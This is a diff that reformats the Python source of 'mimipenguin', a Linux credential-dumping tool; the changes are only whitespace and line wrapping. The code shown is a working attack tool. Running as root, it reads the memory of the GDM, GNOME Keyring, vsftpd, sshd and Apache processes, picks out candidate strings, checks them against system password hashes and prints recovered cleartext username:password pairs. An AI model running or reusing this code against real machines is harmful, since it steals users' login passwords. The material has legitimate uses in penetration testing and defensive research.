@@ -28,8 +28,10 @@ import binascii
 import crypt
 import string
 
+
 def running_as_root():
     return os.geteuid() == 0
+
 
 def get_linux_distribution():
     try:
@@ -37,8 +39,10 @@ def get_linux_distribution():
     except IndexError:
         return str()
 
+
 def compute_hash(ctype, salt, password):
     return crypt.crypt(password, '{}{}'.format(ctype, salt))
+
 
 def strings(s, min_length=4):
     strings_result = list()
@@ -59,6 +63,7 @@ def strings(s, min_length=4):
 
     return strings_result
 
+
 def dump_process(pid):
     dump_result = bytes()
 
@@ -66,7 +71,8 @@ def dump_process(pid):
         for l in maps_file.readlines():
             memrange, attributes = l.split(' ')[:2]
             if attributes.startswith('r'):
-                memrange_start, memrange_stop = [int(x, 16) for x in memrange.split('-')]
+                memrange_start, memrange_stop = [
+                    int(x, 16) for x in memrange.split('-')]
                 memrange_size = memrange_stop - memrange_start
                 with open('/proc/{}/mem'.format(pid), 'rb') as mem_file:
                     try:
@@ -76,6 +82,7 @@ def dump_process(pid):
                         pass
 
     return dump_result
+
 
 def find_pid(process_name):
     pids = list()
@@ -89,6 +96,7 @@ def find_pid(process_name):
             continue
 
     return pids
+
 
 class PasswordFinder:
     _hash_re = r'^\$.\$.+$'
@@ -112,10 +120,11 @@ class PasswordFinder:
 
     def _find_potential_passwords(self):
         for needle in self._needles:
-            needle_indexes = [i for i, s in enumerate(self._strings_dump) \
-                    if re.search(needle, s)]
+            needle_indexes = [i for i, s in enumerate(self._strings_dump)
+                              if re.search(needle, s)]
             for needle_index in needle_indexes:
-                self._potential_passwords += self._strings_dump[needle_index-10:needle_index+10]
+                self._potential_passwords += self._strings_dump[
+                    needle_index - 10:needle_index + 10]
         self._potential_passwords = list(set(self._potential_passwords))
 
     def _try_potential_passwords(self):
@@ -142,9 +151,11 @@ class PasswordFinder:
                 potential_hash = compute_hash(ctype, salt, potential_password)
                 if potential_hash == found_hash:
                     try:
-                        valid_passwords.append((pw_hash_to_user[found_hash], potential_password))
+                        valid_passwords.append(
+                            (pw_hash_to_user[found_hash], potential_password))
                     except KeyError:
-                        valid_passwords.append(('<unknown user>', potential_password))
+                        valid_passwords.append(
+                            ('<unknown user>', potential_password))
 
         return valid_passwords
 
@@ -155,12 +166,15 @@ class PasswordFinder:
 
         return self._try_potential_passwords()
 
+
 class GdmPasswordFinder(PasswordFinder):
     def __init__(self):
         PasswordFinder.__init__(self)
         self._source_name = '[SYSTEM - GNOME]'
         self._target_processes = ['gdm-password']
-        self._needles = ['^_pammodutil_getpwnam_root_1$', '^gkr_system_authtok$']
+        self._needles = ['^_pammodutil_getpwnam_root_1$',
+                         '^gkr_system_authtok$']
+
 
 class GnomeKeyringPasswordFinder(PasswordFinder):
     def __init__(self):
@@ -169,12 +183,15 @@ class GnomeKeyringPasswordFinder(PasswordFinder):
         self._target_processes = ['gnome-keyring-daemon']
         self._needles = [r'^.+libgck\-1\.so\.0$', r'libgcrypt\.so\..+$']
 
+
 class VsftpdPasswordFinder(PasswordFinder):
     def __init__(self):
         PasswordFinder.__init__(self)
         self._source_name = '[SYSTEM - VSFTPD]'
         self._target_processes = ['vsftpd']
-        self._needles = [r'^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$']
+        self._needles = [
+            r'^::.+\:[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$']
+
 
 class SshdPasswordFinder(PasswordFinder):
     def __init__(self):
@@ -182,6 +199,7 @@ class SshdPasswordFinder(PasswordFinder):
         self._source_name = '[SYSTEM - SSH]'
         self._target_processes = ['sshd:']
         self._needles = [r'^sudo.+']
+
 
 class ApachePasswordFinder(PasswordFinder):
     def __init__(self):
@@ -213,6 +231,7 @@ class ApachePasswordFinder(PasswordFinder):
 
         return self._try_potential_passwords()
 
+
 def main():
     if not running_as_root():
         raise RuntimeError('mimipenguin should be ran as root')
@@ -232,8 +251,9 @@ def main():
 
     for password_finder in password_finders:
         for valid_passwords in password_finder.dump_passwords():
-            print('{}\t{}:{}'.format(password_finder._source_name, valid_passwords[0], valid_passwords[1]))
+            print('{}\t{}:{}'.format(password_finder._source_name,
+                                     valid_passwords[0], valid_passwords[1]))
+
 
 if __name__ == '__main__':
     main()
-
